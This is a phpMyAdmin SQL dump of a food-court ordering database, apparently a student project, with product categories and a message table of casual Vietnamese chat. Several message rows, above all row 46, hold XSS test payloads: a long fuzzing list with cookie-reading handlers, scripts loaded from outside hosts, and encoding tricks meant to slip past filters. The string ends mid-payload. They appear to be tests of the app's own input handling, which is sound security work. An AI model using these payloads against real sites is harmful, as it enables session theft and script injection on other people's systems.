-- phpMyAdmin SQL Dump
-- version 5.0.2
-- https://www.phpmyadmin.net/
--
-- Host: localhost
-- Generation Time: Jun 29, 2020 at 03:19 PM
-- Server version: 5.7.30-0ubuntu0.18.04.1-log
-- PHP Version: 7.4.6

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `SmartFoodCourt_DB`
--

-- --------------------------------------------------------

--
-- Table structure for table `category`
--

CREATE TABLE `category` (
  `categoryid` int(11) NOT NULL,
  `catname` varchar(30) COLLATE utf8_vietnamese_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_vietnamese_ci;

--
-- Dumping data for table `category`
--

INSERT INTO `category` (`categoryid`, `catname`) VALUES
(4, 'BREAKFAST'),
(5, 'LUNCH'),
(6, 'DINNER'),
(7, 'DESSERT');

-- --------------------------------------------------------

--
-- Table structure for table `category_product`
--

CREATE TABLE `category_product` (
  `id` int(11) NOT NULL,
  `catname` varchar(100) COLLATE utf8_vietnamese_ci NOT NULL,
  `vendor_id` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_vietnamese_ci;

--
-- Dumping data for table `category_product`
--

INSERT INTO `category_product` (`id`, `catname`, `vendor_id`) VALUES
(2, 'LUNCH', 20),
(3, 'DINNER', 20),
(4, 'DRINK', 20),
(14, 'CAKE', 23),
(15, 'SNACK', 23),
(16, 'DRINK', 23),
(17, 'HOT FOOD', 24),
(18, 'COOL FOOD', 24),
(19, 'DRINK', 24),
(20, 'COFFEE', 25),
(21, 'TEA ', 25),
(22, 'MILK AND OTHERS', 25);

-- --------------------------------------------------------

--
-- Table structure for table `message`
--

CREATE TABLE `message` (
  `id` int(11) NOT NULL,
  `sender_id` int(11) NOT NULL,
  `receiver_id` int(11) NOT NULL,
  `message` text COLLATE utf8_vietnamese_ci NOT NULL,
  `timestamp` int(11) NOT NULL,
  `checked` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_vietnamese_ci;

--
-- Dumping data for table `message`
--

INSERT INTO `message` (`id`, `sender_id`, `receiver_id`, `message`, `timestamp`, `checked`) VALUES
(19, 10, 12, 'Khỏe không ban eei?', 1584327616, 0),
(20, 10, 13, 'Tình đầu là tình đau nhất', 1584327639, 1),
(21, 10, 14, '<scrpit>alert(1)</script>', 1584327665, 0),
(22, 10, 14, '<script>alert(1)</script>', 1584327682, 0),
(23, 10, 9, 'Hi bro', 1584329344, 1),
(24, 10, 9, 'Dạo này khỏe không?', 1584329353, 1),
(25, 9, 10, 'Khỏe! Lại kiếm chuyện gì?', 1584329401, 1),
(26, 10, 9, 'Solo Yasou???? :)', 1584329428, 1),
(27, 9, 10, 'Ơ, cho xin cái tuổi? Thua t xóa nick m, thắng t cũng xóa nick m, okay?', 1584329482, 1),
(28, 10, 9, 'oke tui đâu có chạy :)', 1584329532, 1),
(29, 9, 15, 'Chào anh, anh cho bài tập học sinh đi nhé', 1584329662, 0),
(30, 15, 10, 'Bài làm của em tốt lắm, ngày mai lên thầy \"Thưởng\" cho nhé :>', 1584331020, 1),
(31, 15, 13, 'Thứ 2 lên văn phòng gặp tôi!', 1584332440, 1),
(32, 9, 10, '8h tối mai phố đi bộ Nguyễn Huệ, không gặp không về !', 1584334087, 1),
(37, 13, 9, 'hi amin', 1584341218, 1),
(38, 13, 15, 'em chao thay', 1584341228, 1),
(39, 15, 13, 'chao em', 1584341237, 1),
(40, 13, 15, 'em chao thay', 1584341240, 1),
(41, 13, 10, '2', 1584341247, 1),
(42, 15, 13, '2', 1584341252, 1),
(43, 13, 14, '', 1584341352, 0),
(44, 13, 14, '<script>alert(1)</script>', 1584341361, 0),
(45, 13, 9, '', 1584341549, 1);
INSERT INTO `message` (`id`, `sender_id`, `receiver_id`, `message`, `timestamp`, `checked`) VALUES
(46, 9, 16, '%253Cscript%253Ealert(\'XSS\')%253C%252Fscript%253E <IMG SRC=x onload=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onafterprint=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onbeforeprint=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onbeforeunload=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onerror=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onhashchange=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onload=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onmessage=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x ononline=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onoffline=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onpagehide=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onpageshow=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onpopstate=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onresize=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onstorage=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onunload=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onblur=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onchange=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x oncontextmenu=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x oninput=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x oninvalid=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onreset=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onsearch=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onselect=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onsubmit=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onkeydown=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onkeypress=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onkeyup=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onclick=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x ondblclick=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onmousedown=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onmousemove=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onmouseout=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onmouseover=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onmouseup=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onmousewheel=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onwheel=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x ondrag=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x ondragend=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x ondragenter=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x ondragleave=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x ondragover=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x ondragstart=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x ondrop=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onscroll=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x oncopy=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x oncut=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onpaste=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onabort=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x oncanplay=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x oncanplaythrough=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x oncuechange=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x ondurationchange=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onemptied=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onended=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onerror=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onloadeddata=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onloadedmetadata=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onloadstart=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onpause=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onplay=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onplaying=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onprogress=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onratechange=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onseeked=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onseeking=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onstalled=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onsuspend=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x ontimeupdate=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onvolumechange=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onwaiting=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x onshow=\"alert(String.fromCharCode(88,83,83))\"> <IMG SRC=x ontoggle=\"alert(String.fromCharCode(88,83,83))\"> <META onpaonpageonpagonpageonpageshowshoweshowshowgeshow=\"alert(1)\"; <IMG SRC=x onload=\"alert(String.fromCharCode(88,83,83))\"> <INPUT TYPE=\"BUTTON\" action=\"alert(\'XSS\')\"/> \"><h1><IFRAME SRC=\"javascript:alert(\'XSS\');\"></IFRAME>\">123</h1> \"><h1><IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>123</h1> <IFRAME SRC=\"javascript:alert(\'XSS\');\"></IFRAME> <IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME> \"><h1><IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>123</h1> \"></iframe><script>alert(`TEXT YOU WANT TO BE DISPLAYED`);</script><iframe frameborder=\"0%EF%BB%BF \"><h1><IFRAME width=\"420\" height=\"315\" SRC=\"http://www.youtube.com/embed/sxvccpasgTE\" frameborder=\"0\" onmouseover=\"alert(document.cookie)\"></IFRAME>123</h1> \"><h1><iframe width=\"420\" height=\"315\" src=\"http://www.youtube.com/embed/sxvccpasgTE\" frameborder=\"0\" allowfullscreen></iframe>123</h1> ><h1><IFRAME width=\"420\" height=\"315\" frameborder=\"0\" onmouseover=\"document.location.href=\'https://www.youtube.com/channel/UC9Qa_gXarSmObPX3ooIQZr g\'\"></IFRAME>Hover the cursor to the LEFT of this Message</h1>&ParamHeight=250 <IFRAME width=\"420\" height=\"315\" frameborder=\"0\" onload=\"alert(document.cookie)\"></IFRAME> \"><h1><IFRAME SRC=\"javascript:alert(\'XSS\');\"></IFRAME>\">123</h1> \"><h1><IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>123</h1> <iframe src=http://xss.rocks/scriptlet.html < <IFRAME SRC=\"javascript:alert(\'XSS\');\"></IFRAME> <IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME> <iframe  src=\"&Tab;javascript:prompt(1)&Tab;\"> <svg><style>{font-family&colon;\'<iframe/onload=confirm(1)>\' <input/onmouseover=\"javaSCRIPT&colon;confirm&lpar;1&rpar;\" <sVg><scRipt >alert&lpar;1&rpar; {Opera} <img/src=`` onerror=this.onerror=confirm(1)  <form><isindex formaction=\"javascript&colon;confirm(1)\" <img src=``&NewLine; onerror=alert(1)&NewLine; <script/&Tab; src=\'https://dl.dropbox.com/u/13018058/js.js\' /&Tab;></script> <ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=? <iframe/src=\"data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\"> <script /**/>/**/alert(1)/**/</script /**/ &#34;&#62;<h1/onmouseover=\'\\u0061lert(1)\'> <iframe/src=\"data:text/html,<svg &#111;&#110;load=alert(1)>\"> <meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/> <svg><script xlink:href=data&colon;,window.open(\'https://www.google.com/\') </script <svg><script x:href=\'https://dl.dropbox.com/u/13018058/js.js\' {Opera} <meta http-equiv=\"refresh\" content=\"0;url=javascript:confirm(1)\"> <iframe src=javascript&colon;alert&lpar;document&period;location&rpar;> <form><a href=\"javascript:\\u0061lert&#x28;1&#x29;\">X</script><img/*/src=\"worksinchrome&colon;prompt&#x28;1&#x29;\"/*/onerror=\'eval(src)\'> <img/&#09;&#10;&#11; src=`~` onerror=prompt(1)> <form><iframe &#09;&#10;&#11; src=\"javascript&#58;alert(1)\"&#11;&#10;&#09;;> <a href=\"data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"&#09;&#10;&#11;>X</a http://www.google<script .com>alert(document.location)</script <a&#32;href&#61;&#91;&#00;&#93;\"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;\">XYZ</a <img/src=@&#32;&#13; onerror = prompt(\'&#49;\') <style/onload=prompt&#40;\'&#88;&#83;&#83;\'&#41; <script ^__^>alert(String.fromCharCode(49))</script ^__^ </style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-( &#00;</form><input type&#61;\"date\" onfocus=\"alert(1)\"> <form><textarea &#13; onkeyup=\'\\u0061\\u006C\\u0065\\u0072\\u0074&#x28;1&#x29;\'> <script /***/>/***/confirm(\'\\uFF41\\uFF4C\\uFF45\\uFF52\\uFF54\\u1455\\uFF11\\u1450\')/***/</script /***/ <iframe srcdoc=\'&lt;body onload=prompt&lpar;1&rpar;&gt;\'> <a href=\"javascript:void(0)\" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a> <script ~~~>alert(0%0)</script ~~~> <style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;> <///style///><span %2F onmousemove=\'alert&lpar;1&rpar;\'>SPAN <img/src=\'http://i.imgur.com/P8mL8.jpg\' onmouseover=&Tab;prompt(1) &#34;&#62;<svg><style>{-o-link-source&colon;\'<body/onload=confirm(1)>\' &#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera} <marquee onstart=\'javascript:alert&#x28;1&#x29;\'>^__^ <div/style=\"width:expression(confirm(1))\">X</div> {IE7} <iframe// src=javaSCRIPT&colon;alert(1) //<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type=\'submit\'>// /*iframe/src*/<iframe/src=\"<iframe/src=@\"/onload=prompt(1) /*iframe/src*/> //|\\\\ <script //|\\\\ src=\'https://dl.dropbox.com/u/13018058/js.js\'> //|\\\\ </script //|\\\\ </font>/<svg><style>{src&#x3A;\'<style/onload=this.onload=confirm(1)>\'</font>/</style> <a/href=\"javascript:&#13; javascript:prompt(1)\"><input type=\"X\"> </plaintext\\></|\\><plaintext/onmouseover=prompt(1) </svg>\'\'<svg><script \'AQuickBrownFoxJumpsOverTheLazyDog\'>alert&#x28;1&#x29; {Opera} <a href=\"javascript&colon;\\u0061&#x6C;&#101%72t&lpar;1&rpar;\"><button> <div onmouseover=\'alert&lpar;1&rpar;\'>DIV</div> <iframe style=\"position:absolute;top:0;left:0;width:100%;height:100%\" onmouseover=\"prompt(1)\"> <a href=\"jAvAsCrIpT&colon;alert&lpar;1&rpar;\">X</a> <embed src=\"http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf\"> <object data=\"http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf\"> <var onmouseover=\"prompt(1)\">On Mouse Over</var> <a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a> <img src=\"/\" =_=\" title=\"onerror=\'prompt(1)\'\"> <%<!--\'%><script>alert(1);</script --> <script src=\"data:text/javascript,alert(1)\"></script> <iframe/src \\/\\/onload = prompt(1) <iframe/onreadystatechange=alert(1) <svg/onload=alert(1) <input value=<><iframe/src=javascript:confirm(1) <input type=\"text\" value=`` <div/onmouseover=\'alert(1)\'>X</div> http://www.<script>alert(1)</script .com <iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> <svg><script ?>alert(1) <iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe> <img src=`xx:xx`onerror=alert(1)> <object type=\"text/x-scriptlet\" data=\"http://jsfiddle.net/XLE63/ \"></object> <meta http-equiv=\"refresh\" content=\"0;javascript&colon;alert(1)\"/> <math><a xlink:href=\"//jsfiddle.net/t846h/\">click <embed code=\"http://businessinfo.co.uk/labs/xss/xss.swf\" allowscriptaccess=always> <svg contentScriptType=text/vbs><script>MsgBox+1 <a href=\"data:text/html;base64_,<svg/onload=\\u0061&#x6C;&#101%72t(1)>\">X</a <iframe/onreadystatechange=\\u0061\\u006C\\u0065\\u0072\\u0074(\'\\u0061\') worksinIE> <script>~\'\\u0061\' ; \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073. \\u0061\\u006C\\u0065\\u0072\\u0074(~\'\\u0061\')</script U+ <script/src=\"data&colon;text%2Fj\\u0061v\\u0061script,\\u0061lert(\'\\u0061\')\"></script a=\\u0061 & /=%2F <script/src=data&colon;text/j\\u0061v\\u0061&#115&#99&#114&#105&#112&#116,\\u0061%6C%65%72%74(/XSS/)></script <object data=javascript&colon;\\u0061&#x6C;&#101%72t(1)> <script>+-+-1-+-+alert(1)</script> <body/onload=&lt;!--&gt;&#10alert(1)> <script itworksinallbrowsers>/*<script* */alert(1)</script <img src ?itworksonchrome?\\/onerror = alert(1) <svg><script>//&NewLine;confirm(1);</script </svg> <svg><script onlypossibleinopera:-)> alert(1) <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe <script x> alert(1) </script 1=2 <div/onmouseover=\'alert(1)\'> style=\"x:\"> <--`<img/src=` onerror=alert(1)> --!> <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> <div style=\"position:absolute;top:0;left:0;width:100%;height:100%\" onmouseover=\"prompt(1)\" onclick=\"alert(1)\">x</button> \"><img src=x onerror=window.open(\'https://www.google.com/\');> <form><button formaction=javascript&colon;alert(1)>CLICKME <math><a xlink:href=\"//jsfiddle.net/t846h/\">click <object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object> <iframe src=\"data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\"></iframe> <a href=\"data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203\">Click Me</a> <script\\x20type=\"text/javascript\">javascript:alert(1);</script> <script\\x3Etype=\"text/javascript\">javascript:alert(1);</script> <script\\x0Dtype=\"text/javascript\">javascript:alert(1);</script> <script\\x09type=\"text/javascript\">javascript:alert(1);</script> <script\\x0Ctype=\"text/javascript\">javascript:alert(1);</script> <script\\x2Ftype=\"text/javascript\">javascript:alert(1);</script> <script\\x0Atype=\"text/javascript\">javascript:alert(1);</script> \'`\"><\\x3Cscript>javascript:alert(1)</script>         \'`\"><\\x00script>javascript:alert(1)</script> <img src=1 href=1 onerror=\"javascript:alert(1)\"></img> <audio src=1 href=1 onerror=\"javascript:alert(1)\"></audio> <video src=1 href=1 onerror=\"javascript:alert(1)\"></video> <body src=1 href=1 onerror=\"javascript:alert(1)\"></body> <image src=1 href=1 onerror=\"javascript:alert(1)\"></image> <object src=1 href=1 onerror=\"javascript:alert(1)\"></object> <script src=1 href=1 onerror=\"javascript:alert(1)\"></script> <svg onResize svg onResize=\"javascript:javascript:alert(1)\"></svg onResize> <title onPropertyChange title onPropertyChange=\"javascript:javascript:alert(1)\"></title onPropertyChange> <iframe onLoad iframe onLoad=\"javascript:javascript:alert(1)\"></iframe onLoad> <body onMouseEnter body onMouseEnter=\"javascript:javascript:alert(1)\"></body onMouseEnter> <body onFocus body onFocus=\"javascript:javascript:alert(1)\"></body onFocus> <frameset onScroll frameset onScroll=\"javascript:javascript:alert(1)\"></frameset onScroll> <script onReadyStateChange script onReadyStateChange=\"javascript:javascript:alert(1)\"></script onReadyStateChange> <html onMouseUp html onMouseUp=\"javascript:javascript:alert(1)\"></html onMouseUp> <body onPropertyChange body onPropertyChange=\"javascript:javascript:alert(1)\"></body onPropertyChange> <svg onLoad svg onLoad=\"javascript:javascript:alert(1)\"></svg onLoad> <body onPageHide body onPageHide=\"javascript:javascript:alert(1)\"></body onPageHide> <body onMouseOver body onMouseOver=\"javascript:javascript:alert(1)\"></body onMouseOver> <body onUnload body onUnload=\"javascript:javascript:alert(1)\"></body onUnload> <body onLoad body onLoad=\"javascript:javascript:alert(1)\"></body onLoad> <bgsound onPropertyChange bgsound onPropertyChange=\"javascript:javascript:alert(1)\"></bgsound onPropertyChange> <html onMouseLeave html onMouseLeave=\"javascript:javascript:alert(1)\"></html onMouseLeave> <html onMouseWheel html onMouseWheel=\"javascript:javascript:alert(1)\"></html onMouseWheel> <style onLoad style onLoad=\"javascript:javascript:alert(1)\"></style onLoad> <iframe onReadyStateChange iframe onReadyStateChange=\"javascript:javascript:alert(1)\"></iframe onReadyStateChange> <body onPageShow body onPageShow=\"javascript:javascript:alert(1)\"></body onPageShow> <style onReadyStateChange style onReadyStateChange=\"javascript:javascript:alert(1)\"></style onReadyStateChange> <frameset onFocus frameset onFocus=\"javascript:javascript:alert(1)\"></frameset onFocus> <applet onError applet onError=\"javascript:javascript:alert(1)\"></applet onError> <marquee onStart marquee onStart=\"javascript:javascript:alert(1)\"></marquee onStart> <script onLoad script onLoad=\"javascript:javascript:alert(1)\"></script onLoad> <html onMouseOver html onMouseOver=\"javascript:javascript:alert(1)\"></html onMouseOver> <html onMouseEnter html onMouseEnter=\"javascript:parent.javascript:alert(1)\"></html onMouseEnter> <body onBeforeUnload body onBeforeUnload=\"javascript:javascript:alert(1)\"></body onBeforeUnload> <html onMouseDown html onMouseDown=\"javascript:javascript:alert(1)\"></html onMouseDown> <marquee onScroll marquee onScroll=\"javascript:javascript:alert(1)\"></marquee onScroll> <xml onPropertyChange xml onPropertyChange=\"javascript:javascript:alert(1)\"></xml onPropertyChange> <frameset onBlur frameset onBlur=\"javascript:javascript:alert(1)\"></frameset onBlur> <applet onReadyStateChange applet onReadyStateChange=\"javascript:javascript:alert(1)\"></applet onReadyStateChange> <svg onUnload svg onUnload=\"javascript:javascript:alert(1)\"></svg onUnload> <html onMouseOut html onMouseOut=\"javascript:javascript:alert(1)\"></html onMouseOut> <body onMouseMove body onMouseMove=\"javascript:javascript:alert(1)\"></body onMouseMove> <body onResize body onResize=\"javascript:javascript:alert(1)\"></body onResize> <object onError object onError=\"javascript:javascript:alert(1)\"></object onError> <body onPopState body onPopState=\"javascript:javascript:alert(1)\"></body onPopState> <html onMouseMove html onMouseMove=\"javascript:javascript:alert(1)\"></html onMouseMove> <applet onreadystatechange applet onreadystatechange=\"javascript:javascript:alert(1)\"></applet onreadystatechange> <body onpagehide body onpagehide=\"javascript:javascript:alert(1)\"></body onpagehide> <svg onunload svg onunload=\"javascript:javascript:alert(1)\"></svg onunload> <applet onerror applet onerror=\"javascript:javascript:alert(1)\"></applet onerror> <body onkeyup body onkeyup=\"javascript:javascript:alert(1)\"></body onkeyup> <body onunload body onunload=\"javascript:javascript:alert(1)\"></body onunload> <iframe onload iframe onload=\"javascript:javascript:alert(1)\"></iframe onload> <body onload body onload=\"javascript:javascript:alert(1)\"></body onload> <html onmouseover html onmouseover=\"javascript:javascript:alert(1)\"></html onmouseover> <object onbeforeload object onbeforeload=\"javascript:javascript:alert(1)\"></object onbeforeload> <body onbeforeunload body onbeforeunload=\"javascript:javascript:alert(1)\"></body onbeforeunload> <body onfocus body onfocus=\"javascript:javascript:alert(1)\"></body onfocus> <body onkeydown body onkeydown=\"javascript:javascript:alert(1)\"></body onkeydown> <iframe onbeforeload iframe onbeforeload=\"javascript:javascript:alert(1)\"></iframe onbeforeload> <iframe src iframe src=\"javascript:javascript:alert(1)\"></iframe src> <svg onload svg onload=\"javascript:javascript:alert(1)\"></svg onload> <html onmousemove html onmousemove=\"javascript:javascript:alert(1)\"></html onmousemove> <body onblur body onblur=\"javascript:javascript:alert(1)\"></body onblur> \\x3Cscript>javascript:alert(1)</script> \'\"`><script>/* *\\x2Fjavascript:alert(1)// */</script> <script>javascript:alert(1)</script\\x0D <script>javascript:alert(1)</script\\x0A <script>javascript:alert(1)</script\\x0B <script charset=\"\\x22>javascript:alert(1)</script> <!--\\x3E<img src=xxx:x onerror=javascript:alert(1)> --> --><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> --> --><!-- --\\x00> <img src=xxx:x onerror=javascript:alert(1)> --> --><!-- --\\x21> <img src=xxx:x onerror=javascript:alert(1)> --> --><!-- --\\x3E> <img src=xxx:x onerror=javascript:alert(1)> --> `\"\'><img src=\'#\\x27 onerror=javascript:alert(1)> <a href=\"javascript\\x3Ajavascript:alert(1)\" id=\"fuzzelement1\">test</a> \"\'`><p><svg><script>a=\'hello\\x27;javascript:alert(1)//\';</script></p> <a href=\"javas\\x00cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"javas\\x07cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"javas\\x0Dcript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"javas\\x0Acript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"javas\\x08cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"javas\\x02cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"javas\\x03cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"javas\\x04cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"javas\\x01cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"javas\\x05cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"javas\\x0Bcript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"javas\\x09cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"javas\\x06cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <a href=\"javas\\x0Ccript:javascript:alert(1)\" id=\"fuzzelement1\">test</a> <script>/* *\\x2A/javascript:alert(1)// */</script> <script>/* *\\x00/javascript:alert(1)// */</script> <style></style\\x3E<img src=\"about:blank\" onerror=javascript:alert(1)//></style> <style></style\\x0D<img src=\"about:blank\" onerror=javascript:alert(1)//></style> <style></style\\x09<img src=\"about:blank\" onerror=javascript:alert(1)//></style> <style></style\\x20<img src=\"about:blank\" onerror=javascript:alert(1)//></style> <style></style\\x0A<img src=\"about:blank\" onerror=javascript:alert(1)//></style> \"\'`>ABC<div 